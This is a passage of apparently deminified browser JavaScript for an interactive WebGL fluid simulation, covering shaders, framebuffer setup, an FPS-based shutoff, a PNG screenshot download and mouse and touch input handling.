let positiony = 0;
positiony = window.pageYOffset,
console.log(positiony),
console.log(document.body.clientHeight);
const canvas = document.getElementsByTagName("canvas")[0];
canvas.width = canvas.clientWidth,
canvas.height = canvas.clientHeight;
let config = {
    SIM_RESOLUTION: 128,
    DYE_RESOLUTION: 512,
    DENSITY_DISSIPATION: .97,
    VELOCITY_DISSIPATION: .98,
    PRESSURE_DISSIPATION: .8,
    PRESSURE_ITERATIONS: 20,
    CURL: 3,
    SPLAT_RADIUS: .5,
    SHADING: !0,
    COLORFUL: !0,
    PAUSED: !1
};
function pointerPrototype() {
    this.id = -1,
    this.x = 0,
    this.y = 0,
    this.dx = 0,
    this.dy = 0,
    this.down = !0,
    this.moved = !1,
    this.color = [30, 0, 300]
}
let pointers = []
  , splatStack = [];
pointers.push(new pointerPrototype);
const {gl: gl, ext: ext} = getWebGLContext(canvas);
function getWebGLContext(canvas) {
    const params = {
        alpha: !0,
        depth: !1,
        stencil: !1,
        antialias: !1,
        preserveDrawingBuffer: !1
    };
    let gl = !1;
    const isWebGL2 = !!gl;
    let halfFloat, supportLinearFiltering;
    isWebGL2 || (gl = canvas.getContext("webgl", params) || canvas.getContext("experimental-webgl", params)),
    isWebGL2 ? (gl.getExtension("EXT_color_buffer_float"),
    supportLinearFiltering = gl.getExtension("OES_texture_float_linear")) : (halfFloat = gl.getExtension("OES_texture_half_float"),
    supportLinearFiltering = gl.getExtension("OES_texture_half_float_linear")),
    gl.clearColor(0, 0, 0, 0);
    const halfFloatTexType = isWebGL2 ? gl.HALF_FLOAT : halfFloat.HALF_FLOAT_OES;
    let formatRGBA, formatRG, formatR;
    return isWebGL2 ? (formatRGBA = getSupportedFormat(gl, gl.RGBA16F, gl.RGBA, halfFloatTexType),
    formatRG = getSupportedFormat(gl, gl.RG16F, gl.RG, halfFloatTexType),
    formatR = getSupportedFormat(gl, gl.R16F, gl.RED, halfFloatTexType)) : (formatRGBA = getSupportedFormat(gl, gl.RGBA, gl.RGBA, halfFloatTexType),
    formatRG = getSupportedFormat(gl, gl.RGBA, gl.RGBA, halfFloatTexType),
    formatR = getSupportedFormat(gl, gl.RGBA, gl.RGBA, halfFloatTexType)),
    {
        gl: gl,
        ext: {
            formatRGBA: formatRGBA,
            formatRG: formatRG,
            formatR: formatR,
            halfFloatTexType: halfFloatTexType,
            supportLinearFiltering: supportLinearFiltering
        }
    }
}
function getSupportedFormat(gl, internalFormat, format, type) {
    if (!supportRenderTextureFormat(gl, internalFormat, format, type))
        switch (internalFormat) {
        case gl.R16F:
            return getSupportedFormat(gl, gl.RG16F, gl.RG, type);
        case gl.RG16F:
            return getSupportedFormat(gl, gl.RGBA16F, gl.RGBA, type);
        default:
            return null
        }
    return {
        internalFormat: internalFormat,
        format: format
    }
}
function supportRenderTextureFormat(gl, internalFormat, format, type) {
    let texture = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, texture),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE),
    gl.texImage2D(gl.TEXTURE_2D, 0, internalFormat, 4, 4, 0, format, type, null);
    let fbo = gl.createFramebuffer();
    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo),
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0);
    return gl.checkFramebufferStatus(gl.FRAMEBUFFER) == gl.FRAMEBUFFER_COMPLETE
}
function captureScreenshot() {
    colorProgram.bind(),
    gl.uniform4f(colorProgram.uniforms.color, 0, 0, 0, 1),
    blit(density.write.fbo),
    render(density.write.fbo),
    gl.bindFramebuffer(gl.FRAMEBUFFER, density.write.fbo);
    let length = dyeWidth * dyeHeight * 4
      , pixels = new Float32Array(length);
    gl.readPixels(0, 0, dyeWidth, dyeHeight, gl.RGBA, gl.FLOAT, pixels);
    let newPixels = new Uint8Array(length)
      , id = 0;
    for (let i = dyeHeight - 1; i >= 0; i--)
        for (let j = 0; j < dyeWidth; j++) {
            let nid = i * dyeWidth * 4 + 4 * j;
            newPixels[nid + 0] = 255 * clamp01(pixels[id + 0]),
            newPixels[nid + 1] = 255 * clamp01(pixels[id + 1]),
            newPixels[nid + 2] = 255 * clamp01(pixels[id + 2]),
            newPixels[nid + 3] = 255 * clamp01(pixels[id + 3]),
            id += 4
        }
    let captureCanvas = document.createElement("canvas")
      , ctx = captureCanvas.getContext("2d");
    captureCanvas.width = dyeWidth,
    captureCanvas.height = dyeHeight;
    let imageData = ctx.createImageData(dyeWidth, dyeHeight);
    imageData.data.set(newPixels),
    ctx.putImageData(imageData, 0, 0);
    let datauri = captureCanvas.toDataURL();
    downloadURI("fluid.png", datauri),
    URL.revokeObjectURL(datauri)
}
function clamp01(input) {
    return Math.min(Math.max(input, 0), 1)
}
function downloadURI(filename, uri) {
    let link = document.createElement("a");
    link.download = filename,
    link.href = uri,
    document.body.appendChild(link),
    link.click(),
    document.body.removeChild(link)
}
function isMobile() {
    return /Mobi|Android/i.test(navigator.userAgent)
}
isMobile() && (config.SHADING = !1),
ext.supportLinearFiltering || (config.SHADING = !1);
class GLProgram {
    constructor(vertexShader, fragmentShader) {
        if (this.uniforms = {},
        this.program = gl.createProgram(),
        gl.attachShader(this.program, vertexShader),
        gl.attachShader(this.program, fragmentShader),
        gl.linkProgram(this.program),
        !gl.getProgramParameter(this.program, gl.LINK_STATUS))
            throw gl.getProgramInfoLog(this.program);
        const uniformCount = gl.getProgramParameter(this.program, gl.ACTIVE_UNIFORMS);
        for (let i = 0; i < uniformCount; i++) {
            const uniformName = gl.getActiveUniform(this.program, i).name;
            this.uniforms[uniformName] = gl.getUniformLocation(this.program, uniformName)
        }
    }
    bind() {
        gl.useProgram(this.program)
    }
}
function compileShader(type, source) {
    const shader = gl.createShader(type);
    if (gl.shaderSource(shader, source),
    gl.compileShader(shader),
    !gl.getShaderParameter(shader, gl.COMPILE_STATUS))
        throw gl.getShaderInfoLog(shader);
    return shader
}
const baseVertexShader = compileShader(gl.VERTEX_SHADER, "\n    precision highp float;\n    attribute vec2 aPosition;\n    varying vec2 vUv;\n    varying vec2 vL;\n    varying vec2 vR;\n    varying vec2 vT;\n    varying vec2 vB;\n    uniform vec2 texelSize;\n    void main () {\n        vUv = aPosition * 0.5 + 0.5;\n        vL = vUv - vec2(texelSize.x, 0.0);\n        vR = vUv + vec2(texelSize.x, 0.0);\n        vT = vUv + vec2(0.0, texelSize.y);\n        vB = vUv - vec2(0.0, texelSize.y);\n        gl_Position = vec4(aPosition, 0.0, 1.0);\n    }\n")
  , clearShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    uniform sampler2D uTexture;\n    uniform float value;\n    void main () {\n        gl_FragColor = value * texture2D(uTexture, vUv);\n    }\n")
  , colorShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision mediump float;\n    uniform vec4 color;\n    void main () {\n        gl_FragColor = color;\n    }\n")
  , backgroundShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    uniform sampler2D uTexture;\n    uniform float aspectRatio;\n    #define SCALE 25.0\n    void main () {\n        vec2 uv = floor(vUv * SCALE * vec2(aspectRatio, 1.0));\n        float v = mod(uv.x + uv.y, 2.0);\n        v = v * 0.1 + 0.8;\n        gl_FragColor = vec4(vec3(v), 1.0);\n    }\n")
  , displayShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    uniform sampler2D uTexture;\n    void main () {\n        vec3 C = texture2D(uTexture, vUv).rgb;\n        float a = max(C.r, max(C.g, C.b));\n        gl_FragColor = vec4(C, a);\n    }\n")
  , displayShadingShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    varying vec2 vL;\n    varying vec2 vR;\n    varying vec2 vT;\n    varying vec2 vB;\n    uniform sampler2D uTexture;\n    uniform vec2 texelSize;\n    void main () {\n        vec3 L = texture2D(uTexture, vL).rgb;\n        vec3 R = texture2D(uTexture, vR).rgb;\n        vec3 T = texture2D(uTexture, vT).rgb;\n        vec3 B = texture2D(uTexture, vB).rgb;\n        vec3 C = texture2D(uTexture, vUv).rgb;\n        float dx = length(R) - length(L);\n        float dy = length(T) - length(B);\n        vec3 n = normalize(vec3(dx, dy, length(texelSize)));\n        vec3 l = vec3(0.0, 0.0, 1.0);\n        float diffuse = clamp(dot(n, l) + 0.7, 0.7, 1.0);\n        C.rgb *= diffuse;\n        float a = max(C.r, max(C.g, C.b));\n        gl_FragColor = vec4(C, a);\n    }\n")
  , splatShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    uniform sampler2D uTarget;\n    uniform float aspectRatio;\n    uniform vec3 color;\n    uniform vec2 point;\n    uniform float radius;\n    void main () {\n        vec2 p = vUv - point.xy;\n        p.x *= aspectRatio;\n        vec3 splat = exp(-dot(p, p) / radius) * color;\n        vec3 base = texture2D(uTarget, vUv).xyz;\n        gl_FragColor = vec4(base + splat, 1.0);\n    }\n")
  , advectionManualFilteringShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    uniform sampler2D uVelocity;\n    uniform sampler2D uSource;\n    uniform vec2 texelSize;\n    uniform vec2 dyeTexelSize;\n    uniform float dt;\n    uniform float dissipation;\n    vec4 bilerp (sampler2D sam, vec2 uv, vec2 tsize) {\n        vec2 st = uv / tsize - 0.5;\n        vec2 iuv = floor(st);\n        vec2 fuv = fract(st);\n        vec4 a = texture2D(sam, (iuv + vec2(0.5, 0.5)) * tsize);\n        vec4 b = texture2D(sam, (iuv + vec2(1.5, 0.5)) * tsize);\n        vec4 c = texture2D(sam, (iuv + vec2(0.5, 1.5)) * tsize);\n        vec4 d = texture2D(sam, (iuv + vec2(1.5, 1.5)) * tsize);\n        return mix(mix(a, b, fuv.x), mix(c, d, fuv.x), fuv.y);\n    }\n    void main () {\n        vec2 coord = vUv - dt * bilerp(uVelocity, vUv, texelSize).xy * texelSize;\n        gl_FragColor = dissipation * bilerp(uSource, coord, dyeTexelSize);\n        gl_FragColor.a = 1.0;\n    }\n")
  , advectionShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    uniform sampler2D uVelocity;\n    uniform sampler2D uSource;\n    uniform vec2 texelSize;\n    uniform float dt;\n    uniform float dissipation;\n    void main () {\n        vec2 coord = vUv - dt * texture2D(uVelocity, vUv).xy * texelSize;\n        gl_FragColor = dissipation * texture2D(uSource, coord);\n        gl_FragColor.a = 1.0;\n    }\n")
  , divergenceShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    varying highp vec2 vL;\n    varying highp vec2 vR;\n    varying highp vec2 vT;\n    varying highp vec2 vB;\n    uniform sampler2D uVelocity;\n    void main () {\n        float L = texture2D(uVelocity, vL).x;\n        float R = texture2D(uVelocity, vR).x;\n        float T = texture2D(uVelocity, vT).y;\n        float B = texture2D(uVelocity, vB).y;\n        vec2 C = texture2D(uVelocity, vUv).xy;\n        if (vL.x < 0.0) { L = -C.x; }\n        if (vR.x > 1.0) { R = -C.x; }\n        if (vT.y > 1.0) { T = -C.y; }\n        if (vB.y < 0.0) { B = -C.y; }\n        float div = 0.5 * (R - L + T - B);\n        gl_FragColor = vec4(div, 0.0, 0.0, 1.0);\n    }\n")
  , curlShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    varying highp vec2 vL;\n    varying highp vec2 vR;\n    varying highp vec2 vT;\n    varying highp vec2 vB;\n    uniform sampler2D uVelocity;\n    void main () {\n        float L = texture2D(uVelocity, vL).y;\n        float R = texture2D(uVelocity, vR).y;\n        float T = texture2D(uVelocity, vT).x;\n        float B = texture2D(uVelocity, vB).x;\n        float vorticity = R - L - T + B;\n        gl_FragColor = vec4(0.5 * vorticity, 0.0, 0.0, 1.0);\n    }\n")
  , vorticityShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    varying vec2 vL;\n    varying vec2 vR;\n    varying vec2 vT;\n    varying vec2 vB;\n    uniform sampler2D uVelocity;\n    uniform sampler2D uCurl;\n    uniform float curl;\n    uniform float dt;\n    void main () {\n        float L = texture2D(uCurl, vL).x;\n        float R = texture2D(uCurl, vR).x;\n        float T = texture2D(uCurl, vT).x;\n        float B = texture2D(uCurl, vB).x;\n        float C = texture2D(uCurl, vUv).x;\n        vec2 force = 0.5 * vec2(abs(T) - abs(B), abs(R) - abs(L));\n        force /= length(force) + 0.0001;\n        force *= curl * C;\n        force.y *= -1.0;\n        vec2 vel = texture2D(uVelocity, vUv).xy;\n        gl_FragColor = vec4(vel + force * dt, 0.0, 1.0);\n    }\n")
  , pressureShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    varying highp vec2 vL;\n    varying highp vec2 vR;\n    varying highp vec2 vT;\n    varying highp vec2 vB;\n    uniform sampler2D uPressure;\n    uniform sampler2D uDivergence;\n    vec2 boundary (vec2 uv) {\n        return uv;\n        // uncomment if you use wrap or repeat texture mode\n        // uv = min(max(uv, 0.0), 1.0);\n        // return uv;\n    }\n    void main () {\n        float L = texture2D(uPressure, boundary(vL)).x;\n        float R = texture2D(uPressure, boundary(vR)).x;\n        float T = texture2D(uPressure, boundary(vT)).x;\n        float B = texture2D(uPressure, boundary(vB)).x;\n        float C = texture2D(uPressure, vUv).x;\n        float divergence = texture2D(uDivergence, vUv).x;\n        float pressure = (L + R + B + T - divergence) * 0.25;\n        gl_FragColor = vec4(pressure, 0.0, 0.0, 1.0);\n    }\n")
  , gradientSubtractShader = compileShader(gl.FRAGMENT_SHADER, "\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    varying highp vec2 vL;\n    varying highp vec2 vR;\n    varying highp vec2 vT;\n    varying highp vec2 vB;\n    uniform sampler2D uPressure;\n    uniform sampler2D uVelocity;\n    vec2 boundary (vec2 uv) {\n        return uv;\n        // uv = min(max(uv, 0.0), 1.0);\n        // return uv;\n    }\n    void main () {\n        float L = texture2D(uPressure, boundary(vL)).x;\n        float R = texture2D(uPressure, boundary(vR)).x;\n        float T = texture2D(uPressure, boundary(vT)).x;\n        float B = texture2D(uPressure, boundary(vB)).x;\n        vec2 velocity = texture2D(uVelocity, vUv).xy;\n        velocity.xy -= vec2(R - L, T - B);\n        gl_FragColor = vec4(velocity, 0.0, 1.0);\n    }\n")
  , blit = (gl.bindBuffer(gl.ARRAY_BUFFER, gl.createBuffer()),
gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, -1, 1, 1, 1, 1, -1]), gl.STATIC_DRAW),
gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, gl.createBuffer()),
gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, new Uint16Array([0, 1, 2, 0, 2, 3]), gl.STATIC_DRAW),
gl.vertexAttribPointer(0, 2, gl.FLOAT, !1, 0, 0),
gl.enableVertexAttribArray(0),
destination=>{
    gl.bindFramebuffer(gl.FRAMEBUFFER, destination),
    gl.drawElements(gl.TRIANGLES, 6, gl.UNSIGNED_SHORT, 0)
}
);
let simWidth, simHeight, dyeWidth, dyeHeight, density, velocity, divergence, curl, pressure;
const clearProgram = new GLProgram(baseVertexShader,clearShader)
  , colorProgram = new GLProgram(baseVertexShader,colorShader)
  , backgroundProgram = new GLProgram(baseVertexShader,backgroundShader)
  , displayProgram = new GLProgram(baseVertexShader,displayShader)
  , displayShadingProgram = new GLProgram(baseVertexShader,displayShadingShader)
  , splatProgram = new GLProgram(baseVertexShader,splatShader)
  , advectionProgram = new GLProgram(baseVertexShader,ext.supportLinearFiltering ? advectionShader : advectionManualFilteringShader)
  , divergenceProgram = new GLProgram(baseVertexShader,divergenceShader)
  , curlProgram = new GLProgram(baseVertexShader,curlShader)
  , vorticityProgram = new GLProgram(baseVertexShader,vorticityShader)
  , pressureProgram = new GLProgram(baseVertexShader,pressureShader)
  , gradienSubtractProgram = new GLProgram(baseVertexShader,gradientSubtractShader);
function initFramebuffers() {
    let simRes = getResolution(config.SIM_RESOLUTION)
      , dyeRes = getResolution(config.DYE_RESOLUTION);
    simWidth = simRes.width,
    simHeight = simRes.height,
    dyeWidth = dyeRes.width,
    dyeHeight = dyeRes.height;
    const texType = ext.halfFloatTexType
      , rgba = ext.formatRGBA
      , rg = ext.formatRG
      , r = ext.formatR
      , filtering = ext.supportLinearFiltering ? gl.LINEAR : gl.NEAREST;
    density = null == density ? createDoubleFBO(dyeWidth, dyeHeight, rgba.internalFormat, rgba.format, texType, filtering) : resizeDoubleFBO(density, dyeWidth, dyeHeight, rgba.internalFormat, rgba.format, texType, filtering),
    velocity = null == velocity ? createDoubleFBO(simWidth, simHeight, rg.internalFormat, rg.format, texType, filtering) : resizeDoubleFBO(velocity, simWidth, simHeight, rg.internalFormat, rg.format, texType, filtering),
    divergence = createFBO(simWidth, simHeight, r.internalFormat, r.format, texType, gl.NEAREST),
    curl = createFBO(simWidth, simHeight, r.internalFormat, r.format, texType, gl.NEAREST),
    pressure = createDoubleFBO(simWidth, simHeight, r.internalFormat, r.format, texType, gl.NEAREST)
}
function createFBO(w, h, internalFormat, format, type, param) {
    gl.activeTexture(gl.TEXTURE0);
    let texture = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, texture),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, param),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, param),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE),
    gl.texImage2D(gl.TEXTURE_2D, 0, internalFormat, w, h, 0, format, type, null);
    let fbo = gl.createFramebuffer();
    return gl.bindFramebuffer(gl.FRAMEBUFFER, fbo),
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0),
    gl.viewport(0, 0, w, h),
    gl.clear(gl.COLOR_BUFFER_BIT),
    {
        texture: texture,
        fbo: fbo,
        width: w,
        height: h,
        attach: id=>(gl.activeTexture(gl.TEXTURE0 + id),
        gl.bindTexture(gl.TEXTURE_2D, texture),
        id)
    }
}
function createDoubleFBO(w, h, internalFormat, format, type, param) {
    let fbo1 = createFBO(w, h, internalFormat, format, type, param)
      , fbo2 = createFBO(w, h, internalFormat, format, type, param);
    return {
        get read() {
            return fbo1
        },
        set read(value) {
            fbo1 = value
        },
        get write() {
            return fbo2
        },
        set write(value) {
            fbo2 = value
        },
        swap() {
            let temp = fbo1;
            fbo1 = fbo2,
            fbo2 = temp
        }
    }
}
function resizeFBO(target, w, h, internalFormat, format, type, param) {
    let newFBO = createFBO(w, h, internalFormat, format, type, param);
    return clearProgram.bind(),
    gl.uniform1i(clearProgram.uniforms.uTexture, target.attach(0)),
    gl.uniform1f(clearProgram.uniforms.value, 1),
    blit(newFBO.fbo),
    newFBO
}
function resizeDoubleFBO(target, w, h, internalFormat, format, type, param) {
    return target.read = resizeFBO(target.read, w, h, internalFormat, format, type, param),
    target.write = createFBO(w, h, internalFormat, format, type, param),
    target
}
function createTextureAsync(url) {
    let texture = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, texture),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.REPEAT),
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.REPEAT),
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGB, 1, 1, 0, gl.RGB, gl.UNSIGNED_BYTE, new Uint8Array([255, 255, 255]));
    let obj = {
        texture: texture,
        width: 1,
        height: 1,
        attach: id=>(gl.activeTexture(gl.TEXTURE0 + id),
        gl.bindTexture(gl.TEXTURE_2D, texture),
        id)
    }
      , image = new Image;
    return image.onload = ()=>{
        obj.width = image.width,
        obj.height = image.height,
        gl.bindTexture(gl.TEXTURE_2D, texture),
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGB, gl.RGB, gl.UNSIGNED_BYTE, image)
    }
    ,
    image.src = url,
    obj
}
initFramebuffers(),
multipleSplats(parseInt(20 * Math.random()) + 5);
let lastColorChangeTime = Date.now()
  , step_time = .016;
var lastCalledTime, counter = 0, fpsArray = [], fuckup = 0;
function update(ts) {
    if (!(fuckup > 2)) {
        var fps;
        lastCalledTime || (lastCalledTime = (new Date).getTime(),
        fps = 0);
        var delta = ((new Date).getTime() - lastCalledTime) / 1e3;
        if (lastCalledTime = (new Date).getTime(),
        fps = Math.ceil(1 / delta),
        counter >= 10) {
            var sum = fpsArray.reduce((function(a, b) {
                return a + b
            }
            ))
              , average = Math.ceil(sum / fpsArray.length);
            console.log(average + " fps"),
            average < 30 && fuckup++,
            counter = 0
        } else
            fps !== 1 / 0 && fpsArray.push(fps),
            counter++;
        resizeCanvas(),
        input(),
        config.PAUSED || render(null),
        step(step_time),
        requestAnimationFrame(update)
    }
}
function input() {
    splatStack.length > 0 && multipleSplats(splatStack.pop());
    for (let i = 0; i < pointers.length; i++) {
        const p = pointers[i];
        p.moved && (splat(p.x, p.y, p.dx, p.dy, p.color),
        p.moved = !1)
    }
    if (config.COLORFUL && lastColorChangeTime + 100 < Date.now()) {
        lastColorChangeTime = Date.now();
        for (let i = 0; i < pointers.length; i++) {
            pointers[i].color = generateColor()
        }
    }
}
function step(dt) {
    gl.disable(gl.BLEND),
    gl.viewport(0, 0, simWidth, simHeight),
    curlProgram.bind(),
    gl.uniform2f(curlProgram.uniforms.texelSize, 1 / simWidth, 1 / simHeight),
    gl.uniform1i(curlProgram.uniforms.uVelocity, velocity.read.attach(0)),
    blit(curl.fbo),
    vorticityProgram.bind(),
    gl.uniform2f(vorticityProgram.uniforms.texelSize, 1 / simWidth, 1 / simHeight),
    gl.uniform1i(vorticityProgram.uniforms.uVelocity, velocity.read.attach(0)),
    gl.uniform1i(vorticityProgram.uniforms.uCurl, curl.attach(1)),
    gl.uniform1f(vorticityProgram.uniforms.curl, config.CURL),
    gl.uniform1f(vorticityProgram.uniforms.dt, dt),
    blit(velocity.write.fbo),
    velocity.swap(),
    divergenceProgram.bind(),
    gl.uniform2f(divergenceProgram.uniforms.texelSize, 1 / simWidth, 1 / simHeight),
    gl.uniform1i(divergenceProgram.uniforms.uVelocity, velocity.read.attach(0)),
    blit(divergence.fbo),
    clearProgram.bind(),
    gl.uniform1i(clearProgram.uniforms.uTexture, pressure.read.attach(0)),
    gl.uniform1f(clearProgram.uniforms.value, config.PRESSURE_DISSIPATION),
    blit(pressure.write.fbo),
    pressure.swap(),
    pressureProgram.bind(),
    gl.uniform2f(pressureProgram.uniforms.texelSize, 1 / simWidth, 1 / simHeight),
    gl.uniform1i(pressureProgram.uniforms.uDivergence, divergence.attach(0));
    for (let i = 0; i < config.PRESSURE_ITERATIONS; i++)
        gl.uniform1i(pressureProgram.uniforms.uPressure, pressure.read.attach(1)),
        blit(pressure.write.fbo),
        pressure.swap();
    gradienSubtractProgram.bind(),
    gl.uniform2f(gradienSubtractProgram.uniforms.texelSize, 1 / simWidth, 1 / simHeight),
    gl.uniform1i(gradienSubtractProgram.uniforms.uPressure, pressure.read.attach(0)),
    gl.uniform1i(gradienSubtractProgram.uniforms.uVelocity, velocity.read.attach(1)),
    blit(velocity.write.fbo),
    velocity.swap(),
    advectionProgram.bind(),
    gl.uniform2f(advectionProgram.uniforms.texelSize, 1 / simWidth, 1 / simHeight),
    ext.supportLinearFiltering || gl.uniform2f(advectionProgram.uniforms.dyeTexelSize, 1 / simWidth, 1 / simHeight);
    let velocityId = velocity.read.attach(0);
    gl.uniform1i(advectionProgram.uniforms.uVelocity, velocityId),
    gl.uniform1i(advectionProgram.uniforms.uSource, velocityId),
    gl.uniform1f(advectionProgram.uniforms.dt, dt),
    gl.uniform1f(advectionProgram.uniforms.dissipation, config.VELOCITY_DISSIPATION),
    blit(velocity.write.fbo),
    velocity.swap(),
    gl.viewport(0, 0, dyeWidth, dyeHeight),
    ext.supportLinearFiltering || gl.uniform2f(advectionProgram.uniforms.dyeTexelSize, 1 / dyeWidth, 1 / dyeHeight),
    gl.uniform1i(advectionProgram.uniforms.uVelocity, velocity.read.attach(0)),
    gl.uniform1i(advectionProgram.uniforms.uSource, density.read.attach(1)),
    gl.uniform1f(advectionProgram.uniforms.dissipation, config.DENSITY_DISSIPATION),
    blit(density.write.fbo),
    density.swap()
}
function render(target) {
    null == target ? (gl.blendFunc(gl.ONE, gl.ONE_MINUS_SRC_ALPHA),
    gl.enable(gl.BLEND)) : gl.disable(gl.BLEND);
    let width = null == target ? gl.drawingBufferWidth : dyeWidth
      , height = null == target ? gl.drawingBufferHeight : dyeHeight;
    if (gl.viewport(0, 0, width, height),
    colorProgram.bind(),
    blit(target),
    config.SHADING) {
        let program = displayShadingProgram;
        program.bind(),
        gl.uniform2f(program.uniforms.texelSize, 1 / width, 1 / height),
        gl.uniform1i(program.uniforms.uTexture, density.read.attach(0))
    } else {
        let program = displayProgram;
        program.bind(),
        gl.uniform1i(program.uniforms.uTexture, density.read.attach(0))
    }
    blit(target)
}
function splat(x, y, dx, dy, color) {
    gl.viewport(0, 0, simWidth, simHeight),
    splatProgram.bind(),
    gl.uniform1i(splatProgram.uniforms.uTarget, velocity.read.attach(0)),
    gl.uniform1f(splatProgram.uniforms.aspectRatio, canvas.width / canvas.height),
    gl.uniform2f(splatProgram.uniforms.point, x / canvas.width, 1 - y / canvas.height),
    gl.uniform3f(splatProgram.uniforms.color, dx, -dy, 1),
    gl.uniform1f(splatProgram.uniforms.radius, config.SPLAT_RADIUS / 100),
    blit(velocity.write.fbo),
    velocity.swap(),
    gl.viewport(0, 0, dyeWidth, dyeHeight),
    gl.uniform1i(splatProgram.uniforms.uTarget, density.read.attach(0)),
    gl.uniform3f(splatProgram.uniforms.color, color.r, color.g, color.b),
    blit(density.write.fbo),
    density.swap()
}
function multipleSplats(amount) {
    for (let i = 0; i < amount; i++) {
        const color = generateColor();
        color.r *= 10,
        color.g *= 10,
        color.b *= 10;
        canvas.width,
        Math.random(),
        canvas.height,
        Math.random(),
        Math.random(),
        Math.random()
    }
}
function resizeCanvas() {
    canvas.width == canvas.clientWidth && canvas.height == canvas.clientHeight || (canvas.width = canvas.clientWidth,
    canvas.height = canvas.clientHeight,
    initFramebuffers())
}
function generateColor() {
    let c = HSVtoRGB(Math.random(), 1, 1);
    return c.r *= .15,
    c.g *= .15,
    c.b *= .15,
    c
}
function HSVtoRGB(h, s, v) {
    let r, g, b, i, f, p, q, t;
    switch (i = Math.floor(6 * h),
    f = 6 * h - i,
    p = v * (1 - s),
    q = v * (1 - f * s),
    t = v * (1 - (1 - f) * s),
    i % 6) {
    case 0:
        r = v,
        g = t,
        b = p;
        break;
    case 1:
        r = q,
        g = v,
        b = p;
        break;
    case 2:
        r = p,
        g = v,
        b = t;
        break;
    case 3:
        r = p,
        g = q,
        b = v;
        break;
    case 4:
        r = t,
        g = p,
        b = v;
        break;
    case 5:
        r = v,
        g = p,
        b = q
    }
    return {
        r: r,
        g: g,
        b: b
    }
}
function getResolution(resolution) {
    let aspectRatio = gl.drawingBufferWidth / gl.drawingBufferHeight;
    aspectRatio < 1 && (aspectRatio = 1 / aspectRatio);
    let max = Math.round(resolution * aspectRatio)
      , min = Math.round(resolution);
    return gl.drawingBufferWidth > gl.drawingBufferHeight ? {
        width: max,
        height: min
    } : {
        width: min,
        height: max
    }
}
function getTextureScale(texture, width, height) {
    return {
        x: width / texture.width,
        y: height / texture.height
    }
}
update(),
document.body.addEventListener("mousemove", (e=>{
    const x = e.clientX
      , y = e.clientY;
    pointers[0].moved = pointers[0].down,
    pointers[0].dx = 5 * (x - pointers[0].x),
    pointers[0].dy = 5 * (y - pointers[0].y),
    pointers[0].x = x,
    pointers[0].y = y
}
)),
document.body.addEventListener("touchmove", (e=>{
    const touches = e.targetTouches;
    for (let i = 0; i < touches.length; i++) {
        let pointer = pointers[i];
        pointer.moved = pointer.down,
        pointer.dx = 8 * (touches[i].clientX - pointer.x),
        pointer.dy = 8 * (touches[i].clientY - pointer.y),
        pointer.x = touches[i].clientX,
        pointer.y = touches[i].clientY
    }
}
), !1),
document.body.addEventListener("touchstart", (e=>{
    const touches = e.targetTouches;
    for (let i = 0; i < touches.length; i++)
        i >= pointers.length && pointers.push(new pointerPrototype),
        pointers[i].id = touches[i].identifier,
        pointers[i].down = !0,
        pointers[i].x = touches[i].clientX,
        pointers[i].y = touches[i].clientY,
        pointers[i].color = generateColor()
}
)),
window.addEventListener("mouseover", (()=>{
    pointers[0].down = !0,
    pointers[0].color = generateColor()
}
)),
